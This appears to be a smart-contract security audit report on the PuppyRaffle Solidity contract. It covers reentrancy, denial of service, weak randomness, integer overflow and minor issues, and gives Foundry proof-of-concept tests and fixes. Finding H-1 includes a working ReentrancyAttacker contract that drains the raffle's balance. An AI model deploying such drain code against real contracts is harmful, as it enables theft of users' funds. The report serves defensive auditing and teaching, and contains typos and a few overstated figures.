### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance 

**Description:**  The `PuppyRaffle::refund` function does not follow `CEI` as a result, enables participants to drain the smart contract all of the money using reentrancy attack 

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making the external call do we update the `PuppyRaffle::players` array


```javascript
function refund(uint256 playerIndex) public {
    
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```
A player who has entered the raffle could have a `fallback/receive` function that calls the `PuppyRaffle::refund` function again and again claiming the refund till the contract is drained of all the money.

**Impact:** All fees paid by the raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Attacker enters the raffle 
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker calls `PuppyRaffle::refund` from their attack contract, during the contract balance.

**Proof of Code**
<details>
<summary>Code</summary>

```javascript
function test_reentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log("starting balance of attacker contract", startingAttackContractBalance);
    console.log("starting victim contract balance", startingContractBalance);

    console.log("ending balance of attacker contract balance", address(attackerContract).balance);
    console.log("ending balance of puppy raffle balance", address(puppyRaffle).balance);
}
```

Add this to contract as well
``` javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyraffle) {
        puppyRaffle = _puppyraffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealmoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealmoney();
    }

    receive() external payable {
        _stealmoney();
    }
}


```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call, additionally, we should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
    
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
    
    payable(msg.sender).sendValue(entranceFee);
    
-    players[playerIndex] = address(0);
-    emit RaffleRefunded(playerAddress);
}

```

### [H-2] Title  Looping through players to check for duplicates in `PuppyRaffle.sol::enterRaffle` is a potential Denial of service (DoS) attack, incrementing gas cost for future entrants

IMPACT: Medium/
Likelihood: Medium

**Description:** The `Puppyraffle::enterRaffle` function loops through the `player` array to check for duplicates.However, the longer the `PuppyRaffle::players` array is, the more checks a new player who enter right when the raffle stats will be dramatically lower than those who enter later, every additional address in  the `players` array, is an additional check the loop will have to make.

**Impact:**  The gas costs will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PuppRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

if we have 2 sets of 100 players enter, the gas costs will be as be as such
- 1st 100 players - 6252848 gas approximately
- 2nd 100 players - 10068138 gas approximately

This is more than 3x more than the first player

<details>
<summary>PoC</summary>
    place the following test into `puppyRaffleTest.t.sol


``` javascript
function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testMoreGasIsNeededToEnterRaffle() public {
        vm.txGasPrice(1);
        address[] memory players = new address[](100);

        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(i);
        }
        uint256 gastart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsed = (gastart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players", gasUsed);

        address[] memory playersTwo = new address[](100);

        for (uint256 i = 0; i < 100; i++) {
            playersTwo[i] = address(i + 100);
        }
        uint256 gastartsecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndsecond = gasleft();

        uint256 gasUsedsecond = (gastartsecond - gasEndsecond) * tx.gasprice;
        console.log("Gas cost of the first 100 players", gasUsedsecond);

        assert(gasUsed < gasUsedsecond);
    }
```
</details>

**Recommended Mitigation:** There are a few recommendations

1. consider allowing duplicates Users can make new wallets addresses , so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check  for duplicates. This would allow constant time looping of whether a user has already entered 
3. Use an enum of true and false , true already entered or false not yet entered.

## [H-3] weak randomness is `PuppyRaffle::selectWinner` allows users to influence or predict the winner


**Description** Hashing `msg.sender`, `block.timestamp` and `block.diffuclty` together creates a pedictable find number. A prdicatable number is not good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner the raffle themselvers.

This means user could frontrun this function and call `refund` if they see they are not the winner

**Impact** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy

**Proof of Concept**
1. Validators can know the variables used to there advantage,
2. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner
3. Users can revert their `selectWinner` transaction if they dont like the winner or the resulting puppy.
using on-chain values as randomness seed is a well documented vector in the blockchain course

**Recommended Mitigation**
consider using a cryptographically provable random number generator such as VRF

## [H-4] Integer overflow of `PuppyRaffle::totalfees` loses fees

**Description** 
    In solidity versions prior to `0.8.0` integers were subject to integer overflows;

```javascript 
    uint64 myvar = type(uint64).max
    //18446744073709551615
    myvar = myvar + 1
    // myvar will be 0
```
**Impact** In `selectwinner` fees are accumalated for the feeaddrss to collect later in `PuppyRaffle::withdrawFees`, However, if the `totalFees` overflows, the `feeaddress` may not collect the correct amount of fees leaving fees, permantely stuck in the contract.

**Proof of Concept**

<details>
<summary>Code</summary>

``` javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

```
</details>

1. we conclude a raffle of 4 players
2. we then have 89 players enter a new raffle, and conlude the raffle totalees will overflow 
3. you will not be able to withdraw fees from the contract. 
**Recommended Mitigation**
1. Use a newer version of solidity and uint256 instead of uint64
2. you could use the `SafeMath` library of OpenZeppilin for versions 07.6  of solidity, however you would still have a hard time with the `uint64` type.


### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)



# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle 

**Description:** If a player is in the `PuppyRaffle::Players` array at index 0 the player may not collaborate in the raffle since 0 is returned for inactive players

**Proof of Concept:**
```javascript

    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```
**Impact:** The player at location zero is going to be marked inactive wasting gas



**Recommended Mitigation:** 
1. avoid returning zero for that an index of a player, rather return true or false 

# Gas

## [G-1] unchanged state variables should be declared constant or immutable 
Reading from storage is much more expensive than reading from a constant or immutable

Instances:
`PuppyRaffle::raffleDuration` should be `immutable `
`PuppyRaffle::commonImageUri` should be  `constant`
`PuppyRaffle::rareImageUri` should be `constant`
`PuppyRaffle::legendaryImageUri` should be `constant`

## [G-2]: unused loop reading from the storage is more expensive than reading from caching `PuppyRaffle::enterRaffle`
``` javascript
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }

```
## Recommendations
    use a cache to store the length of the players
``` javascript
    uint256 length = players.length;
```

## Informational

## [Info-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

## [I-2] using an outdated version of solidity is not recommended

## Recommenditions
    - see slither recommendations 
    https://github.com/crytic/slither/wiki/Detector-Documentation#different-pragma-directives-are-used

## [I-3] Missing checks for `address(0)` when assigning values to address state variables
Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 64](src/PuppyRaffle.sol#L64)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 173](src/PuppyRaffle.sol#L173)

	```solidity
	        previousWinner = winner; // e vanity, doesn't matter much.
	```

- Found in src/PuppyRaffle.sol [Line: 193](src/PuppyRaffle.sol#L193)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [I-3] Test Coverage 

**Description:** The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

```
| File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
| ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
| script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
| src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
| test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
| Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
```

**Recommended Mitigation:** Increase test coverage to 90% or higher, especially for the `Branches` column. 


## [I-4] `PuppRaffle::selectwinner` Should follow checks, Effects, Interactions.

**Description**
following CEI is best practise to avoid being rekt by not changing states {effects} before interactions{depositing, withdrawing }
**Impact**
```diff
-   (bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);

+    (bool success,) = winner.call{value: prizePool}("");
+  require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

**Proof of Concept**
CEI  check www.rekt.com
**Recommended Mitigation**

follow CEI while updating state

## [L-5] Use of Magic numbers is discouraged

**Description**
it can be confusing to see number literal in a codebase, and it's much more readable if the numbers are give a name

**Recommended Mitigation**
Instead you could use constants
